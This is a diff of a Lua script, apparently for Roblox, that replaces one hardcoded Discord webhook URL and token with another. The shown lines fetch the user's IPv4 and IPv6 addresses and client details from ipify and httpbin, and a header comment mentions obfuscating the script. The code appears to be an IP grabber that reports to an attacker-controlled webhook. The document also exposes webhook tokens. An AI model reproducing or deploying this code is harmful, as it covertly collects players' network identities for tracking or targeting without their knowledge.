@@ -10,7 +10,7 @@
     and obfuscate it.
 ]]--
 
-local Webhook = "https://discord.com/api/webhooks/1425602202361266219/TZfgHKUaHyK911OBkZW07vCOLxDsH2WsAFgIaf2fM8ZeeaWVO92pBIeSu1MGG8k2Md9J" -- Put your Webhook link here
+local Webhook = "https://discord.com/api/webhooks/1443058911983829036/KgB7s1dpUGqbfJVGrHP25JkQcBYdNxDCLeXBHkQqstehezpLKtIhL4BhNmgX6m-rq1na" -- Put your Webhook link here
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
 local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
 local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
